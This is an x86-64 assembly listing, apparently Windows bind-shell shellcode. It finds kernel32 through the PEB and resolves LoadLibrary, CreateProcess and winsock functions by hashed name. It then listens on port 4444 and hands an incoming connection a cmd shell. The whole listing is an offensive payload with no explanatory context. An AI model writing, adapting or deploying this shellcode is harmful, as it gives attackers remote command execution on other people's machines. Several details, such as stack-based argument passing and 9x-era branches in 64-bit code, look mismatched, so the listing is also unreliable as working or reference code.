section .text
global _start

_start:
    ; Jump to the startup bounce point
    jmp startup_bnc

find_kernel32:
    ; Preserve registers
    push rsi
    xor rax, rax
    mov rax, gs:[rax + 0x60]
    test rax, rax
    js find_kernel32_9x
find_kernel32_nt:
    mov rax, [rax + 0x18]
    mov rsi, [rax + 0x30]
    lodsq
    mov rax, [rax + 0x10]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov rax, [rax + 0x34]
    lea rax, [rax + 0x7c]
    mov rax, [rax + 0x3c]
find_kernel32_finished:
    pop rsi
    ret

find_function:
    ; Preserve all registers
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    mov rbp, [rsp + 0x78]
    mov rax, [rbp + 0x60]
    mov rdx, [rbp + rax + 0x88]
    add rdx, rbp
    mov rcx, [rdx + 0x20]
    mov rbx, [rdx + 0x28]
    add rbx, rbp
find_function_loop:
    jrcxz find_function_finished
    dec rcx
    mov rsi, [rbx + rcx * 8]
    add rsi, rbp
    xor rdi, rdi
    xor rax, rax
    cld
compute_hash:
    lodsb
    test al, al
    jz compute_hash_finished
    ror rdi, 0xd
    add rdi, rax
    jmp compute_hash
compute_hash_finished:
    cmp rdi, [rsp + 0x80]
    jnz find_function_loop
    mov rbx, [rdx + 0x30]
    add rbx, rbp
    mov cx, [rbx + 2 * rcx]
    mov rbx, [rdx + 0x28]
    add rbx, rbp
    mov rax, [rbx + 8 * rcx]
    add rax, rbp
    mov [rsp + 0x78], rax
find_function_finished:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret

startup_bnc:
    jmp startup

resolve_symbols_for_dll:
    lodsq
    push rax
    push rdx
    call find_function
    mov [rdi], rax
    add rsp, 0x10
    add rdi, 0x08
    cmp rsi, rcx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret

kernel32_symbol_hashes:
    dq 0xec0e4e8e
    dq 0x16b3fe72
    dq 0x73e2d87e

ws2_32_symbol_hashes:
    dq 0xadf509d9
    dq 0xc7701aa4
    dq 0xe92eada4
    dq 0x498649e5

startup:
    sub rsp, 0x60
    mov rbp, rsp
    jmp get_absolute_address_forward
get_absolute_address_middle:
    jmp get_absolute_address_end
get_absolute_address_forward:
    call get_absolute_address_middle
get_absolute_address_end:
    pop rsi
    call find_kernel32
    mov rdx, rax
resolve_kernel32_symbols:
    sub rsi, 0x2a
    lea rdi, [rbp + 0x08]
    mov rcx, rsi
    add rcx, 0x18
    call resolve_symbols_for_dll
resolve_winsock_symbols:
    add rcx, 0x20
    mov rax, 0x74656e01
    sar rax, 0x08
    push rax
    push 0x696e6977
    mov rbx, rsp
    push rcx
    push rdx
    push rbx
    call [rbp + 0x08]
    pop rdx
    pop rcx
    mov rdx, rax
    call resolve_symbols_for_dll
initialize_cmd:
    mov rax, 0x646d6301
    sar rax, 0x08
    push rax
    mov [rbp + 0x40], rsp
create_socket:
    xor rax, rax
    push rax
    push rax
    push rax
    push rax
    inc rax
    push rax
    inc rax
    push rax
    call [rbp + 0x40]
    mov rsi, rax
bind:
    xor rax, rax
    xor rbx, rbx
    push rax
    push rax
    push rax
    mov rax, 0x5c110102
    dec ah
    push rax
    mov rax, rsp
    mov bl, 0x10
    push rbx
    push rax
    push rsi
    call [rbp + 0x48]
listen:
    push rbx
    push rsi
    call [rbp + 0x50]
accept:
    push rbx
    mov rdx, rsp
    sub rsp, rbx
    mov rcx, rsp
    push rdx
    push rcx
    push rsi
    call [rbp + 0x58]
    mov rsi, rax
initialize_process:
    xor rcx, rcx
    mov cl, 0x54
    sub rsp, rcx
    mov rdi, rsp
    push rdi
zero_structs:
    xor rax, rax
    rep stosb
    pop rdi
initialize_structs:
    mov byte ptr [rdi], 0x44
    inc byte ptr [rdi + 0x2d]
    push rdi
    mov rax, rsi
    lea rdi, [rdi + 0x38]
    stosq
    stosq
    stosq
    pop rdi
execute_process:
    xor rax, rax
    lea rsi, [rdi + 0x44]
    push rsi
    push rdi
    push rax
    push rax
    push rax
    inc rax
    push rax
    dec rax
    push rax
    push rax
    push [rbp + 0x40]
    push rax
    call [rbp + 0x30]
exit_process:
    call [rbp + 0x38]